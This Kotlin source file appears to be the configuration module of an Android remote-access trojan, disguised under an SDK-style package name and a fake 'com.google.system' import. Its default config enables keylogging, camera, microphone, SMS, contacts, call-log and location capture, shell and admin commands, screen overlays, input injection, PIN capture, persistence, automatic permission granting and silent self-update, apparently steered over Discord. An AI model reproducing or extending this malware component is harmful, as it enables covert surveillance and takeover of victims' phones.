package com.openaccess.sdk.update

import android.content.Context
import com.google.system.DiscordGatewayClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ConfigManager {
    private const val PREFS_NAME = "remote_config"
    private const val KEY_CONFIG = "config_json"
    private const val KEY_VERSION = "config_version"
    private const val KEY_FETCHED_AT = "config_fetched_at"

    private val defaultConfig = JSONObject().apply {
        put("version", 1)
        put("commands", JSONObject().apply {
            put("screenshot", true)
            put("camera", true)
            put("mic", true)
            put("location", true)
            put("contacts", true)
            put("sms", true)
            put("call_log", true)
            put("clipboard", true)
            put("keylog", true)
            put("wifi", true)
            put("battery", true)
            put("processes", true)
            put("installed", true)
            put("notifications", true)
            put("shell", true)
            put("admin", true)
            put("overlay", true)
            put("click", true)
            put("input", true)
            put("open", true)
            put("screen", true)
            put("gesture", true)
            put("pin", true)
            put("torch", true)
            put("vibrate", true)
            put("stream", true)
            put("persist", true)
            put("update", true)
        })
        put("settings", JSONObject().apply {
            put("heartbeat_min", 300000)
            put("heartbeat_max", 600000)
            put("screenshot_quality", 85)
            put("stream_fps", 2)
            put("max_stream_failures", 5)
            put("keylog_max_size", 50000)
            put("notif_max_count", 100)
        })
        put("features", JSONObject().apply {
            put("auto_permission_grant", true)
            put("black_overlay_on_lock", false)
            put("crash_report_to_discord", true)
            put("auto_install_update", true)
        })
    }

    fun getConfig(ctx: Context): JSONObject {
        return try {
            val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val json = prefs.getString(KEY_CONFIG, null)
            if (json != null) {
                JSONObject(json)
            } else {
                defaultConfig
            }
        } catch (_: Exception) {
            defaultConfig
        }
    }

    fun saveConfig(ctx: Context, config: JSONObject) {
        try {
            val version = config.optInt("version", 1)
            val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit()
                .putString(KEY_CONFIG, config.toString())
                .putInt(KEY_VERSION, version)
                .putLong(KEY_FETCHED_AT, System.currentTimeMillis())
                .apply()
        } catch (_: Exception) {}
    }

    fun clearConfig(ctx: Context) {
        try {
            ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().clear().apply()
        } catch (_: Exception) {}
    }

    fun isCommandEnabled(ctx: Context, cmd: String): Boolean {
        return try {
            val config = getConfig(ctx)
            val commands = config.optJSONObject("commands") ?: return true
            commands.optBoolean(cmd, true)
        } catch (_: Exception) {
            true
        }
    }

    fun getSetting(ctx: Context, key: String, default: Int): Int {
        return try {
            val config = getConfig(ctx)
            val settings = config.optJSONObject("settings") ?: return default
            settings.optInt(key, default)
        } catch (_: Exception) {
            default
        }
    }

    fun getSetting(ctx: Context, key: String, default: Boolean): Boolean {
        return try {
            val config = getConfig(ctx)
            val features = config.optJSONObject("features") ?: return default
            features.optBoolean(key, default)
        } catch (_: Exception) {
            default
        }
    }

    fun getConfigStatus(ctx: Context): String {
        return try {
            val config = getConfig(ctx)
            val version = config.optInt("version", 0)
            val fetchedAt = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getLong(KEY_FETCHED_AT, 0)
            val commands = config.optJSONObject("commands")
            val enabled = commands?.let {
                var count = 0
                var total = 0
                val keys = it.keys()
                while (keys.hasNext()) {
                    val k = keys.next()
                    total++
                    if (it.optBoolean(k, true)) count++
                }
                "$count/$total"
            } ?: "all"

            val timeAgo = if (fetchedAt > 0) {
                val diff = (System.currentTimeMillis() - fetchedAt) / 1000
                when {
                    diff < 60 -> "${diff}s ago"
                    diff < 3600 -> "${diff / 60}m ago"
                    else -> "${diff / 3600}h ago"
                }
            } else { "never" }

            "v$version | Commands: $enabled | Fetched: $timeAgo"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}
